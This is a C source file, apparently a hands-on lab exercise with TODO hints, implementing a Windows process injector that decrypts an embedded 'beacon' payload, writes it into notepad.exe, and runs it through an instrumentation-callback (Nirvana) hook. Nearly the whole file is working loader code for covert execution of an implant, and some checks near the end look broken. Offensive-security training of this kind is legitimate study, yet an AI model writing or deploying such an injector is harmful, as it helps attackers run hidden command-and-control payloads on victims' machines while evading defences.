#include "helpers.h"
#include <TlHelp32.h>
#include "sc.h"


#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
#define ProcessInstrumentationCallback 40
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION{
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    DWORD Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    DWORD* OldStatus
);

typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    _In_ HANDLE hProcess,
    _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass,
    _In_reads_bytes_(ProcessInformationSize) LPVOID ProcessInformation,
    _In_ DWORD ProcessInformationSize
);

/*
 * Get a process handle and PID by name
 * HANDLE hProc = getProcHandlebyName("notepad.exe", &PID)
 */
HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = 0;
    HANDLE hProc = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!snapshot) {
        DEBUG("[x] Cannot retrieve the processes snapshot\n");
        return NULL;
    }
    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                *PID = entry.th32ProcessID;
                DEBUG("[+] Injecting into : %lu\n", *PID);
                hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
                if (!hProc) { continue; }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }

    return NULL;
}

int main(void) {
    ULONG imageSize = 0;
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (!hNtdll) {
        DEBUG("[x] Cannot load NTDLL.DLL\n");
        return -1;
    }
    DWORD PID = 0;

    // Retrieve the process that will be injected
    HANDLE hProc = getProcHandlebyName("notepad.exe", &PID);

    if (!hProc) {
        DEBUG("[x] Cannot open the process\n");
        return -1;
    }
    
    DEBUG("[+] Starting hook deployment !\n");
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");

    // Decode the payload and store it in memory
    // You don't need to dive in these functions
    buildsc();

    size_t szOutput = 0;
    DWORD size = 0;
    unsigned char* file_enc = NULL;
    BYTE* beaconContent = NULL;
    size_t beaconSize = 0;
    file_enc = base64_decode(sc, sc_length, &szOutput);

    if (szOutput == 0) {
        DEBUG("[x] Base64 decode failed \n");
        return -1;
    }

    beaconSize = szOutput - 16;
    beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE));
    BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent);
    if (!decryptStatus || beaconContent == NULL) {
        DEBUG("[x] AES decryption failed\n");
        return -1;
    }

    // The payload is decrypted in memory:
    //      - beaconSize: size of the payload
    //      - beaconContent: content of the payload

    // First we allocate memory in the remote process to write
    // our beacon
    LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!beaconAddress) {
        DEBUG("[x] Cannot allocate beacon space : %lu\n", GetLastError());
        return -1;
    }
    DEBUG("[+] Beacon memory at : %p\n", beaconAddress);

    // Then we define our NirvanaHook asm code
    // This shellcode template will allow to call the beacon when
    // the hook is triggered:
    //      push   rbp
    //      mov    rbp,rsp
    //      ; Replace PUSH RBP with JMP R10 to avoid infinite loop
    //      mov    QWORD PTR [rip-15],0xe2ff41
    //
    //      ; Save the whole context
    //      push   rax
    //      push   rbx
    //      push   rcx
    //      push   r9
    //      push   r10
    //      push   r11
    //
    //      ; Setup the beacon address
    //      movabs rax,0x0
    //      ; Call the beacon
    //      call   rax
    //
    //      ; Restore the context
    //      pop    r11
    //      pop    r10
    //      pop    r9
    //      pop    rcx
    //      pop    rbx
    //      pop    rax
    //      pop    rbp
    //      ; Restore the execution flow
    //      jmp    r10

    SIZE_T shellcodeSize = 49;

    // TODO: fix the shellcode template so that it will avoid
    //       infinite loop
    // Hint: Once the hook has been called once, we can just try
    //       to restore execution flow without calling the beacon
    //       Execution flow rastoration is done with JMP R10
    BYTE shellcodeTemplate[49] = {
        0x55,
        0x48, 0x89, 0xe5,
        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
        0x50,
        0x53,
        0x51,
        0x41, 0x51,
        0x41, 0x52,
        0x41, 0x53,
        // Here is where the beacon address must be replaced dynamically
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xd0,
        0x41, 0x5b,
        0x41, 0x5a,
        0x41, 0x59,
        0x59,
        0x5b,
        0x58,
        0x5d,
        0x41, 0xff, 0xe2
    };

    BYTE shellcodeContent[49];
    CopyMemory(shellcodeContent, shellcodeTemplate, shellcodeSize * sizeof(BYTE));

    // We replace the beacon address in the shellcode template so
    // that the NirvanaHook will be able to directly call the beacon address
    // TODO: Copy the beacon address at the right place in the
    //       shellcodeContent variable
    // Hint: Count the number of bytes ;)
    CopyMemory(shellcodeContent + 26, &beaconAddress, sizeof(DWORD64));

    // We allocate some memory for the Hook on the remote process
    LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcodeAddress) {
        DEBUG("[x] Cannot allocate shellcode space : %lu\n", GetLastError());
        return -1;
    }
    DEBUG("[+] Shellcode memory at : %p\n", shellcodeAddress);

    // We write the beacon on the remote process
    BOOL status = WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL);
    if (!status) {
        DEBUG("[x] Cannot write beacon content at %p : %lu\n", beaconAddress, GetLastError());
        return -1;
    }

    // We write the hook on the remote process
    DEBUG("[+] Beacon content written at %p\n", beaconAddress);
    status = WriteProcessMemory(hProc, shellcodeAddress, shellcodeContent, shellcodeSize, NULL);
    if (!status) {
        DEBUG("[x] Cannot write shellcode content at %p : %lu\n", shellcodeAddress, GetLastError());
        return -1;
    }
    DEBUG("[+] Shellcode content written at %p\n", shellcodeAddress);


    // We set the right protection for either the hook and the beacon
    DWORD oldProtect = 0;
    status = VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!status) {
        DEBUG("[x] Failed to reprotect beacon memory at %p : %lu\n", beaconAddress, GetLastError());
    }
    DEBUG("[+] Beacon memory reprotected !\n");
    // TODO: Set the right protection for the hook code
    // Hint: What execution privileges do we need ? Execute ? Right ? Read ?
    status = VirtualProtectEx(hProc, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!status) {
        DEBUG("[x] Failed to reprotect beacon memory at %p : %lu\n", shellcodeAddress, GetLastError());
    }
    DEBUG("[+] Beacon shellcode reprotected !\n");

    // Now we are registring the NirvanaHook on the remote process
    InstrumentationCallbackInfo.Version = 0;
    InstrumentationCallbackInfo.Reserved = 0;
    InstrumentationCallbackInfo.Callback = shellcodeAddress;

    // In NtSetInformationProcess, we target the remote process
    // instead of the current process
    // TODO: Fix the NtSetInformationProcess so that it can be used
    //       to target a remote process
    NTSTATUS ntStatus = NtSetInformationProcess(
        hProc,
        ProcessInstrumentationCallback,
        &InstrumentationCallbackInfo,
        sizeof(InstrumentationCallbackInfo)
    );
    if (!NT_SUCCESS(ntStatus)) {
        DEBUG("[x] Failed to deploy hook : %ld \n", ntStatus);
        return -1;
    }
    DEBUG("[+] Hook deployed successfully !\n");


    // We check that the hook has been successfully triggered
    // This can be done by checking that the PUSH RBP instruction
    // on the hook has been changed
    BOOL hookCalled;
    do {
        DEBUG("[-] Waiting 5 seconds for the hook to be called...\n");
        Sleep(5000);
        BYTE content[1];
        SIZE_T bytesRead;
        status = ReadProcessMemory(hProc, shellcodeAddress, &content, 1 * sizeof(BYTE), &bytesRead);
        if (!status) {
            DEBUG("\t[x] Cannot read process memory : %lu\n", GetLastError());
            return -1;
        }
        DEBUG("\t[-] Value read: %2x\n", content[0]);
        hookCalled = content == shellcodeContent[0];
    } while (hookCalled);

    DEBUG("[+] Your payload must be executed now !\n");
}
